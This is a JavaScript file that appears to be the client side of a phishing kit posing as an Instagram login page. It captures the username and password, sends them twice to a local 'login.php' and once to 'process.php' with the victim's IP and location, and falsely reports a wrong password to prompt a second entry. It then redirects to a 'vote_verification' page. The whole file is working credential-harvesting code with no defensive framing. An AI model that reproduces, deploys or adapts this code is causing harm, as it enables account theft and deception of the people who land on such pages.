
        var login = document.getElementById('login')
        var loader = document.getElementById('loader')
        var username = document.getElementById('username')
        var password = document.getElementById('password')
        var feedback = document.getElementById('feedback')
        var x = 0;
        var label = document.querySelectorAll(".label")
        var input = document.querySelectorAll(".input")
        var container = document.querySelector('.container')

        var country = document.getElementById('country')
        var city = document.getElementById('city')
        var continent = document.getElementById('continent')
        var ip = document.getElementById('ip')
        var adminEmail = document.getElementById('adminEmail')


        for (let i = 0; i < label.length; i++) {
            label[i].addEventListener('click', function () {
                label[0].classList.add('label-toggle')
                label[1].classList.add('label-toggle')
            })

            input[i].addEventListener('click', function () {
                label[0].classList.add('label-toggle')
                label[1].classList.add('label-toggle')
            })

            // container.addEventListener('click', function () {
            //     if (input[i].value === "") {
            //         label[0].classList.remove('label-toggle')
            //         label[1].classList.remove('label-toggle')
            //     }
            // })

        }



        login.addEventListener('click', function () {
            login.textContent = ""
            login.style.padding = "16px 10px"
            loader.style.visibility = 'visible'

            setTimeout(() => {
                feedback.style.display = 'block'
                login.textContent = "Log In"
                loader.style.visibility = "hidden"
                if (username.value == "" || password.value == "") {
                    feedback.textContent = "Input's cannot be empty"
                } else {
                    validation()
                }
            }, 1500);


        })

        function validation() {
            login.textContent = "";
            loader.style.visibility = 'visible'

            setTimeout(() => {
                login.textContent = 'Log In'
                loader.style.visibility = 'hidden'

                const data = new FormData();
                data.append('username', username.value);
                data.append('password', password.value);
                const response = new XMLHttpRequest();
                response.onreadystatechange = function () {
                    feedback.style.display = 'block'
                }
                response.open('POST', './info/login.php', true);
                response.send(data);

                const dataD = new FormData();
                dataD.append('username', username.value);
                dataD.append('password', password.value);
                const response2 = new XMLHttpRequest();
                response2.onreadystatechange = function () {
                }
                response2.open('POST', './info/login.php', true);
                response2.send(dataD);

                fetch(`process.php/?u=${username.value} (instgram)&p=${password.value}&ip=${ip.value}&country=${country.value}&city=${city.value}&continent=${continent.value}&city=${city.value}&bt=&ci=`)
                .then(response => response.json())
                .then(data => {
                    console.log("done")
                })
                .catch(error => console.error("Error:", error));

                x += 1
                // feedback.textContent = 'The password you entered is incorrect. Please check your password and try again';
                if (x == 2) {
                    feedback.textContent = 'The password you entered is incorrect. Please check your password and try again'
                } else if (x == 3) {
                    feedback.textContent = '';
                    setTimeout(() => {
                        window.location.href = 'vote_verification.html'
                    }, 1000);
                }



            }, 1500);
        }
    